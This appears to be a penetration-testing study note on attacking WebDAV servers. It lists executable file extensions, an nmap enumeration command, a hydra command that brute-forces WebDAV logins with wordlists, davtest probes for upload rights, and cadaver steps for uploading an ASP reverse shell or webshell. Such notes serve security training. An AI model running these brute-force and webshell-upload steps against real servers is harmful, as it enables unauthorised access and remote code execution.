
Supported executable file extensities
```
.asp
.aspx
.config
.php
```

#### WebDAV

```
nmap -sV -p 80 --script=http-enum <ip>
```

Brut-force the user and pass for authentication 
```
	hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_users.txt <IP> http-get /webdav/
```

###### Tools
1. `davtest` : used to scan , auth & exploit a DAV server.
	-> `davtest -url http://IP/webdav`  #without authentication
	 -> `davtest -auth user:pass -url http://ip/webdev` #With authentication
	-> give info about which filetypes can be upload , is directory writeable or not etc.

2. `cadaver` : It supports , file uploads , download , on screen display , in place editing , name-space operation (move/copy) , collection creation & deletion , property manipulation & resource locking on DAV servers.
	-> `cadaver http://IP/webdav` : fill user and password in prompt and use `put`
	command to upload a file like `.asp` reverse shell.
	-> */usr/share/webshells/asp/webshell.asp*